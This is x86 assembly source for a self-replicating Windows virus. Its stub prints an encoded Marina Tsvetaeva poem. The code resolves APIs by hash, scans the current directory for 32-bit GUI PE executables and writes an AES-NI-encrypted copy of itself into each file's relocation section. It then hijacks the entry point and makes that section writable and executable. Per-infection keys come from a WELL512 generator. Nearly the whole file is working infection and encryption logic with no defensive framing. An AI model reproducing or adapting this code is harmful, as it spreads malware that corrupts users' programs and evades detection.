.386
.model  flat, stdcall
include sigrun.inc
.code
assume  fs:nothing

link_text       proc     near
        call    text_end

text_begin      label    near
        db      49h, 20h, 63h, 68h
        db      72h, 69h, 73h, 74h
        db      65h, 6eh, 20h, 79h
        db      6fh, 75h, 72h, 20h
        db      66h, 72h, 69h, 67h
        db      68h, 74h, 65h, 6eh
        db      69h, 6eh, 67h, 20h
        db      66h, 6ch, 69h, 67h
        db      68h, 74h, 3ah, 0ah
        db      0dh, 59h, 6fh, 75h
        db      6eh, 67h, 20h, 65h
        db      61h, 67h, 6ch, 65h
        db      2ch, 20h, 72h, 69h
        db      73h, 65h, 20h, 69h
        db      6eh, 20h, 74h, 68h
        db      65h, 20h, 61h, 69h
        db      72h, 21h, 0ah, 0dh
        db      59h, 6fh, 75h, 20h
        db      73h, 74h, 61h, 72h
        db      65h, 64h, 20h, 61h
        db      74h, 20h, 74h, 68h
        db      65h, 20h, 73h, 75h
        db      6eh, 21h, 20h, 2dh
        db      20h, 6dh, 79h, 20h
        db      6ch, 69h, 67h, 68h
        db      74h, 0ah, 0dh, 41h
        db      6eh, 64h, 20h, 64h
        db      65h, 6ch, 69h, 63h
        db      61h, 74h, 65h, 20h
        db      67h, 61h, 7ah, 65h
        db      20h, 63h, 61h, 6eh
        db      27h, 74h, 20h, 63h
        db      6fh, 6dh, 70h, 61h
        db      72h, 65h, 2eh, 0ah
        db      0dh, 0ah, 0dh, 49h
        db      20h, 73h, 74h, 6fh
        db      6fh, 64h, 2ch, 20h
        db      6dh, 6fh, 72h, 65h
        db      20h, 74h, 65h, 6eh
        db      64h, 65h, 72h, 20h
        db      74h, 68h, 61h, 6eh
        db      20h, 74h, 68h, 6fh
        db      73h, 65h, 0ah, 0dh
        db      57h, 68h, 6fh, 27h
        db      76h, 65h, 20h, 77h
        db      69h, 74h, 6eh, 65h
        db      73h, 73h, 65h, 64h
        db      20h, 79h, 6fh, 75h
        db      20h, 64h, 69h, 73h
        db      61h, 70h, 70h, 65h
        db      61h, 72h, 2eh, 2eh
        db      2eh, 0ah, 0dh, 49h
        db      27h, 6dh, 20h, 6bh
        db      69h, 73h, 73h, 69h
        db      6eh, 67h, 20h, 79h
        db      6fh, 75h, 20h, 6eh
        db      6fh, 77h, 20h, 2dh
        db      20h, 61h, 63h, 72h
        db      6fh, 73h, 73h, 0ah
        db      0dh, 54h, 68h, 65h
        db      20h, 67h, 61h, 70h
        db      20h, 6fh, 66h, 20h
        db      61h, 20h, 74h, 68h
        db      6fh, 75h, 73h, 61h
        db      6eh, 64h, 20h, 79h
        db      65h, 61h, 72h, 73h
        db      2eh, 0ah, 0dh, 4dh
        db      61h, 72h, 69h, 6eh
        db      61h, 20h, 54h, 73h
        db      76h, 65h, 74h, 61h
        db      65h, 76h, 61h, 20h
        db      28h, 31h, 39h, 31h
        db      36h, 29h, 0ah, 0dh

text_end        label    near
        pop     eax
        xor     ebx, ebx
        push    ebx
        push    860h
        push    ebx
        push    ebx
        push    offset text_end - offset text_begin
        push    eax
        push    -0bh                         ;STD_OUTPUT_HANDLE
        call    WriteFile
        call    Sleep
        call    ExitProcess
link_text       endp

init_evang      label    near
        xor     esi, esi
        push    offset link_text
        push    fs:[esi]
        mov     fs:[esi], esp

code_begin      label    near

;-------------------------------------------------------------------------------
;here begins replication code
;-------------------------------------------------------------------------------

        cdq
        mov     eax, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.lpLoaderData]
        mov     esi, dword ptr [eax + _PEB_LDR_DATA.dwInLoadOrderModuleList.FLink]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     ebp, dword ptr [eax + 18h]
        call    walk_dll
        dd      0b09315f4h                   ;CloseHandle
        dd      040cf273dh                   ;CreateFileMappingW
        dd      0a1efe929h                   ;CreateFileW
        dd      0d82bf69ah                   ;FindClose
        dd      03d3f609fh                   ;FindFirstFileW
        dd      081f39c19h                   ;FindNextFileW
        dd      05b4219f8h                   ;GetTickCount
        dd      0a89b382fh                   ;MapViewOfFile
        dd      0e1bf2253h                   ;SetFileAttributesW
        dd      0391ab6afh                   ;UnmapViewOfFile

walk_dll        label    near

;-------------------------------------------------------------------------------
;DLL walker
;-------------------------------------------------------------------------------

        pop     esi
        mov     ebx, ebp
        mov     eax, dword ptr [ebp + IMAGE_DOS_HEADER_E_LFANEW]
        add     ebx, dword ptr [ebp + eax + IMAGE_DOS_HEADER_E_LFANEW shl 1]

walk_names      label    near
        mov     eax, ebp
        mov     edi, ebp
        inc     edx
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY_ADDRESS_OF_NAMES]
        add     edi, dword ptr [eax + edx * 4]
        or      eax, -1

crc32_l1        label    near
        xor     al, byte ptr [edi]
        mov     cl, 8

crc32_l2        label    near
        shr     eax, 1
        jnc     crc32_l3
        xor     eax, 0edb88320h

crc32_l3        label    near
        loop    crc32_l2
        inc     edi
        cmp     byte ptr [edi], cl
        jne     crc32_l1
        not     eax
        cmp     dword ptr [esi], eax
        jne     walk_names
        mov     edi, ebp
        mov     eax, ebp
        add     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY_ADDRESS_OF_NAME_ORDINALS]
        movzx   edi, word ptr [edi + edx * 2]
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY_ADDRESS_OF_FUNCTIONS]
        mov     eax, dword ptr [eax + edi * 4]
        add     eax, ebp
        push    eax
        lods    dword ptr [esi]
        cmp     al, 0afh
        jnz     walk_names

;-------------------------------------------------------------------------------
;initialize random number generator
;-------------------------------------------------------------------------------

        lea     edi, dword ptr [esi + (offset states - offset walk_dll)]
        push    (offset index - offset states) / (offset skip_wrdata - offset index)
        pop     esi

init_state      label    near
        call    dword ptr [esp + mapStackAPIK32.kGetTickCount]
        stos    dword ptr [edi]
        dec     esi
        jnz     init_state
        xchg    eax, esi
        stos    dword ptr [edi]
        enter   sizeof WIN32_FIND_DATA * 2, 0
        push    "*"
        mov     esi, esp
        push    esi
        push    esi
        call    dword ptr [ebp + sizeof mapStackAPIK32.kCloseHandle + mapStackAPIK32.kFindFirstFileW]
        xchg    edi, eax
        xor     ebx, ebx

map_file        label   near
        push    dword ptr [esi + WIN32_FIND_DATA.dwFileAttributes]
        lea     ecx, dword ptr [esi + low WIN32_FIND_DATA.cFileName]
        push    ecx
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    3                            ;GENERIC_READ | GENERIC_WRITE
        push    ecx
        push    FILE_ATTRIBUTE_ARCHIVE
        push    ecx
        call    dword ptr [ebp + sizeof mapStackAPIK32.kCloseHandle + mapStackAPIK32.kSetFileAttributesW]
        call    dword ptr [ebp + sizeof mapStackAPIK32.kCloseHandle + mapStackAPIK32.kCreateFileW]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    PAGE_READWRITE
        push    ebx
        push    eax
        call    dword ptr [ebp + sizeof mapStackAPIK32.kCloseHandle + mapStackAPIK32.kCreateFileMappingW]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    FILE_MAP_WRITE
        push    eax
        call    dword ptr [ebp + sizeof mapStackAPIK32.kCloseHandle + mapStackAPIK32.kMapViewOfFile]
        push    eax
        pushad
        call    infect_exe
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        call    dword ptr [ebp + sizeof mapStackAPIK32.kCloseHandle + mapStackAPIK32.kUnmapViewOfFile]
        call    dword ptr [ebp + sizeof mapStackAPIK32.kCloseHandle]
        call    dword ptr [ebp + sizeof mapStackAPIK32.kCloseHandle]
        call    dword ptr [ebp + sizeof mapStackAPIK32.kCloseHandle + mapStackAPIK32.kSetFileAttributesW]
        push    esi
        push    edi
        call    dword ptr [ebp + sizeof mapStackAPIK32.kCloseHandle + mapStackAPIK32.kFindNextFileW]
        test    eax, eax
        jnz     map_file
        push    edi
        call    dword ptr [ebp + sizeof mapStackAPIK32.kCloseHandle + mapStackAPIK32.kFindClose]

breakpoint      label    near

;-------------------------------------------------------------------------------
;common exit point
;-------------------------------------------------------------------------------

        int     3

infect_exe      label    near

;-------------------------------------------------------------------------------
;parse file struct
;signatures must match those of PE files
;-------------------------------------------------------------------------------

        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        cmp     word ptr [eax], "ZM"
        jne     breakpoint
        mov     edi, eax
        add     eax, dword ptr [eax + IMAGE_DOS_HEADER_E_LFANEW]
        cmp     dword ptr [eax], "EP"
        jne     breakpoint

;-------------------------------------------------------------------------------
;32-bit machine
;discard DLL files (because they do not have own PEB) and system files
;do not test IMAGE_FILE_32BIT_MACHINE because it is ignored by Windows even for PE32+
;-------------------------------------------------------------------------------

        cmp     word ptr [eax + IMAGE_NT_HEADERS_FILEHEADER_MACHINE], IMAGE_FILE_MACHINE_I386
        jne     breakpoint
        movzx   ecx, word ptr [eax + IMAGE_NT_HEADERS_FILEHEADER_CHARACTERISTICS]
        test    cl, IMAGE_FILE_EXECUTABLE_IMAGE
        jz      breakpoint
        test    ch, high (IMAGE_FILE_DLL or IMAGE_FILE_SYSTEM)
        jnz     breakpoint

;-------------------------------------------------------------------------------
;before check size of optional header make sure optional header is PE32
;IMAGE_NT_OPTIONAL_HDR_MAGIC must match PE32 structure (not ROM, not 64-bit) configuration
;-------------------------------------------------------------------------------

        cmp     word ptr [eax + IMAGE_NT_HEADERS_OPTIONALHEADER_MAGIC], IMAGE_NT_OPTIONAL_HDR32_MAGIC
        jne     breakpoint

;-------------------------------------------------------------------------------
;standard SizeOfOptionalHeader
;-------------------------------------------------------------------------------

        movzx   edx, word ptr [eax + IMAGE_NT_HEADERS_FILEHEADER_SIZEOF_OPTIONAL_HEADER]
        cmp     dx, 0e0h
        jne     breakpoint

;-------------------------------------------------------------------------------
;no config table, because it might contain SafeSEH
;-------------------------------------------------------------------------------

        cmp     dword ptr [eax + IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG_TABLE], ebx
        jne     breakpoint

skip_ldcchk     label    near

;-------------------------------------------------------------------------------
;Windows GUI subsystem file only
;-------------------------------------------------------------------------------

        cmp     word ptr [eax + IMAGE_NT_HEADERS_OPTIONALHEADER_SUBSYSTEM], IMAGE_SUBSYSTEM_WINDOWS_GUI
        jne     breakpoint

;-------------------------------------------------------------------------------
;reloc place
;must start at the beginning of last section, and must be large enough to hold the
;decryptor and encrypted body
;-------------------------------------------------------------------------------

        imul    cx, word ptr [eax + IMAGE_NT_HEADERS_FILEHEADER_NUMBER_OF_SECTIONS], IMAGE_SECTION_HEADER_SIZEOF
        lea     esi, dword ptr [eax + edx + (IMAGE_NT_HEADERS_OPTIONALHEADER_MAGIC - IMAGE_SECTION_HEADER_SIZEOF) + IMAGE_SECTION_HEADER_VIRTUAL_ADDRESS]
        add     esi, ecx
        mov     edx, dword ptr [esi]
        mov     bl, IMAGE_DIRECTORY_ENTRY_RELOC_TABLE
        add     ebx, eax
        cmp     dword ptr [ebx], edx
        jne     breakpoint
        cmp     dword ptr [ebx + 4], blockCount * 10h + (offset init_setup - offset decryptor) + 0ah
        jb      breakpoint
        pushad
        call    init_setup

;-------------------------------------------------------------------------------
;enable SSE support
;-------------------------------------------------------------------------------

.xmm

decryptor       label    near

;-------------------------------------------------------------------------------
;save GPR registers, then SSE states
;we do not use CPUID to test for Intel AES-NI support because we are protected by SEH anyway
;-------------------------------------------------------------------------------

        pop     esi                          ;ciphertext/plaintext buffer pointer
        mov     eax, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.dwImageBaseAddress]
        add     dword ptr [esp + sizeof mapStackRegisters], eax
        mov     eax, esp

;-------------------------------------------------------------------------------
;initialise memory for FPU context
;-------------------------------------------------------------------------------

        and     sp, 0f000h                   ;memory can't be reused
        fxsave  dword ptr [esp]
        push    eax
        call    init_sehpr
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        pop     eax
        fxrstor dword ptr [esp]
        xchg    eax, esp
        popad
        ret

init_sehpr      label    near
        xor     ecx, ecx
        push    dword ptr fs:[ecx]
        mov     dword ptr fs:[ecx], esp
        push    esi
        push    ebx
        mov     ebx, esi                     ;overwrite ciphertext with plaintext

aesenc_entry    label    near                ;encryption entrypoint

;-------------------------------------------------------------------------------
;initialise memory for key schedule
;stack does not need to be aligned for SSE/AES-NI in this case because we use unaligned memory movs
;-------------------------------------------------------------------------------

        mov     eax, esp
        enter   RIJNDAEL_KEY_SCHEDULE_SIZE, 0
        mov     edi, esp
        call    skip_key

aes128_key      label    near
        dd      1986h
        dd      1986h
        dd      1986h
        dd      1986h

aeskgen_expand  label    near

;-------------------------------------------------------------------------------
;AES128 key expansion procedure
;-------------------------------------------------------------------------------

        db      066h                         ;aeskeygenassist xmm2, xmm1, rcon
        db      00fh
        db      03ah                         ;aeskeygenassit and aesdeclast share opcode
        db      __AESKEYGENASSIST
        db      0c0h or (xmmreg2 shl 3) or xmmreg1

delta_rcon      label    near
        db      1                            ;RCON (round constant) dynamically replaced
        push    eax
        push    ebx
        push    edi
        db      066h, 00fh, 070h, 0d2h, 0ffh ;shufps  xmm2, xmm2, 11111111b
        xorps   xmm2, xmm1
        db      066h, 00fh, 07eh, 0d0h       ;movd    eax, xmm2
        stos    dword ptr [edi]
        db      066h, 00fh, 070h, 0c9h, 0e5h ;shufps  xmm1, xmm1, 011100101b
        db      066h, 00fh, 07eh, 0cbh       ;movd    ebx, xmm1
        xor     eax, ebx
        stos    dword ptr [edi]
        db      066h, 00fh, 070h, 0c9h, 0e6h ;shufps  xmm1, xmm1, 011100110b
        db      066h, 00fh, 07eh, 0cbh       ;movd    ebx, xmm1
        xor     eax, ebx
        stos    dword ptr [edi]
        db      066h, 00fh, 070h, 0c9h, 0e7h ;shufps  xmm1, xmm1, 011100111b
        db      066h, 00fh, 07eh, 0cbh       ;movd    ebx, xmm1
        xor     eax, ebx
        stos    dword ptr [edi]
        pop     eax
        movups  xmm1, oword ptr [eax]
        pop     ebx
        pop     eax
        ret

skip_key        label    near
        pop     edx
        movups  xmm1, oword ptr [edx]
        add     edx, offset aeskgen_expand - offset aes128_key
        push    edi
        movups  oword ptr [edi], xmm1
        add     edi, 10h
        mov     cl, 7
        call    edx

callaesk_loop   label    near
        shl     byte ptr [edx + (offset delta_rcon - offset aeskgen_expand)], 1
        call    edx
        loop    callaesk_loop
        mov     byte ptr [edx + (offset delta_rcon - offset aeskgen_expand)], 1bh
        call    edx
        shl     byte ptr [edx + (offset delta_rcon - offset aeskgen_expand)], 1
        call    edx
        mov     byte ptr [edx + (offset delta_rcon - offset aeskgen_expand)], 1

;-------------------------------------------------------------------------------
;AES128 encryption engine using Intel AES-NI
;-------------------------------------------------------------------------------

        push    low blockCount
        pop     edx

aesenc_loop     label    near
        pop     edi
        push    edi
        add     edi, 1986h
        org     $ - 4
        dd      0

delta_fixsc     label    near
        movups  xmm1, oword ptr [ebx]
        movups  xmm2, oword ptr [edi]
        xorps   xmm1, xmm2                   ;xorps xmm1, oword ptr [edi] only if EDI is aligned
        mov     cl, 9

aesenc_nloop    label    near
        add     edi, 10h
        movups  xmm2, oword ptr [edi]
        db      066h
        db      00fh
        db      038h

delta_aesimc    label    near
        db      __AESENC
        db      0c0h or (xmmreg3 shl 3) or xmmreg4
        db      066h
        db      00fh
        db      038h
        db      __AESENC

delta_aesenc    label    near
        db      0c0h or (xmmreg1 shl 3) or xmmreg2
        loop    aesenc_nloop
        movups  xmm2, oword ptr [edi + 10h]

delta_fixup2    label    near
        db      066h
        db      00fh
        db      038h
        db      __AESENCLAST

delta_aesencl   label    near
        db      0c0h or (xmmreg1 shl 3) or xmmreg2
        movups  oword ptr [esi], xmm1
        add     ebx, 10h
        add     esi, 10h
        dec     edx
        jnz     aesenc_loop
        xchg    eax, esp
        pop     ebx
        ret

init_setup      label    near

;-------------------------------------------------------------------------------
;initialise code, keys, encryption, and decryptor
;-------------------------------------------------------------------------------

        mov     edx, dword ptr [eax + IMAGE_NT_HEADERS_OPTIONALHEADER_ADDRESS_OF_ENTRYPOINT]
        add     edi, dword ptr [esi + (IMAGE_SECTION_HEADER_POINTER_TO_RAW_DATA - IMAGE_SECTION_HEADER_VIRTUAL_ADDRESS)]
        mov     al, 68h
        stos    byte ptr [edi]
        xchg    eax, edx
        stos    dword ptr [edi]
        mov     ax, 0e860h
        stos    word ptr [edi]
        mov     eax, blockCount * 10h
        stos    dword ptr [edi]
        mov     esi, edi
        pop     ebx
        lea     edi, dword ptr [ebx + (offset aes128_key - offset decryptor)]
        push    4
        pop     ecx

frstore_key     label    near
        call    well512
        stos    dword ptr [edi]
        loop    frstore_key
        push    ebx
        lea     ebx, dword ptr [ebx - (offset decryptor - offset code_begin)]
        call    init_encrypt
        mov     edi, esi
        pop     esi
        mov     ecx, offset init_setup - offset decryptor
        rep     movs byte ptr [edi], byte ptr [esi]
        mov     byte ptr [edi - (offset init_setup - offset delta_fixsc) - 4], 0a0h
        mov     byte ptr [edi - (offset init_setup - offset aesenc_nloop) + 1], 0efh
        mov     word ptr [edi - (offset init_setup - offset delta_aesimc)], ((0c0h or (xmmreg2 shl 3) or xmmreg2) shl 8) or __AESIMC
        mov     byte ptr [edi - (offset init_setup - offset delta_aesenc) - 1], __AESDEC
        neg     byte ptr [edi - (offset init_setup - offset delta_fixup2) - 1]
        mov     byte ptr [edi - (offset init_setup - offset delta_aesencl) - 1], __AESDECLAST
        popad
        or      byte ptr [esi + (IMAGE_SECTION_HEADER_CHARACTERISTICS - IMAGE_SECTION_HEADER_VIRTUAL_ADDRESS) + 3], (IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE) shr 18h
        mov     dword ptr [eax + IMAGE_NT_HEADERS_OPTIONALHEADER_ADDRESS_OF_ENTRYPOINT], edx
        and     word ptr [eax + IMAGE_NT_HEADERS_OPTIONALHEADER_DLLCHARACTERISTICS], not (IMAGE_DLLCHARACTERISTICS_NO_SEH or IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY)
        fldz
        fistp   qword ptr [ebx]
        int     3

init_encrypt    label    near
        push    eax
        jmp     aesenc_entry

;-------------------------------------------------------------------------------
;WELL512 (Well Equidistributed Long-period Linear) PRNG algorithm by Francois Panneton,
;Pierre L'Ecuyer and Makoto Matsumoto.  ported to C/C++ for uint generation by Chris Lomont
;-------------------------------------------------------------------------------

well512         proc
        pushad
        call    skip_wrdata

states          label    near
        dd      "****", "****", "****"
        dd      "****", "****", "****", "****", "****"
        dd      "****", "****", "****", "****", "****"
        dd      "****", "****", "****"

index           label    near
        dd      "****"

skip_wrdata     label    near
        pop     ebx
        mov     eax, dword ptr [ebx + (offset index - offset states)]
        lea     esi, dword ptr [ebx + eax * 4]
        mov     ecx, dword ptr [esi]
        lea     edx, dword ptr [eax - 3]
        and     edx, 0fh
        mov     edi, dword ptr [ebx + edx * 4]
        lea     edx, dword ptr [ecx + ecx]
        xor     edx, edi
        shl     edx, 0fh
        xor     edx, edi
        xor     edx, ecx
        lea     ecx, dword ptr [eax - 7]
        and     ecx, 0fh
        mov     ecx, dword ptr [ebx + ecx * 4]
        mov     edi, ecx
        shr     edi, 0bh
        xor     ecx, edi
        mov     edi, edx
        xor     edi, ecx
        mov     dword ptr [esi], edi
        mov     esi, edi
        and     esi, 0fed22169h
        shl     esi, 5
        xor     esi, edi
        shl     ecx, 0ah
        xor     ecx, edx
        shl     ecx, 10h
        dec     eax
        and     eax, 0fh
        xor     ecx, dword ptr [ebx + eax * 4]
        shl     ecx, 2
        xor     ecx, esi
        xor     ecx, edx
        xor     ecx, dword ptr [ebx + eax * 4]
        mov     dword ptr [ebx + eax * 4], ecx
        mov     dword ptr [ebx + (offset index - offset states)], eax
        mov     dword ptr [esp + mapStackRegisters.regEax], ecx
        popad
        ret
well512         endp

evang_tail      label    near
        dd      0ch dup (?)

end     init_evang